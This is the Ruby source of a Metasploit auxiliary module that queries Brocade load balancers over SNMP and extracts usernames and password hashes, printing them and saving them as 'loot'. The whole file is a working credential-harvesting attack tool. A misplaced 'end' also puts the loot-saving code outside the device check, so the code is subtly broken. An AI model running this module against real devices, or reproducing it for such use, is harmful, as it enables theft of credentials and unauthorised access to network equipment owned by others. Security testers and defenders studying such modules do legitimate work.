#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Brocade Password Hash Enumeration',
      'Description' => "This module will extract password hashes from Brocade load balancer devices",
      'Author'      => ['Deral "PercentX" Heiland'],
      'License'     => MSF_LICENSE
    )

  end

  def run_host(ip)
    begin
      snmp = connect_snmp

      if snmp.get_value('sysDescr.0') =~ /Brocade/

        @users = []
        snmp.walk("1.3.6.1.4.1.1991.1.1.2.9.2.1.1") do |row|
          row.each { |val| @users << val.value.to_s }
        end

        @hashes = []
        snmp.walk("1.3.6.1.4.1.1991.1.1.2.9.2.1.2") do |row|
          row.each { |val| @hashes << val.value.to_s }
        end

        print_good("#{ip} Found Users & Password Hashes:")
        end

        credinfo = ""
        @users.each_index do |i|
        credinfo << "#{@users[i]}:#{@hashes[i]}" << "\n"
        print_good("#{@users[i]}:#{@hashes[i]}")
        end


     #Woot we got loot.
     loot_name     = "brocade.hashes"
     loot_type     = "text/plain"
     loot_filename = "brocade_hashes.text"
     loot_desc     = "Brodace username and password hashes"
     p = store_loot(loot_name, loot_type, datastore['RHOST'], credinfo , loot_filename, loot_desc)

     print_status("Credentials saved in: #{p.to_s}")
     rescue ::SNMP::UnsupportedVersion
     rescue ::SNMP::RequestTimeout
     rescue ::Interrupt
       raise $!
     rescue ::Exception => e
       print_error("#{ip} error: #{e.class} #{e}")
     disconnect_snmp
     end
  end
end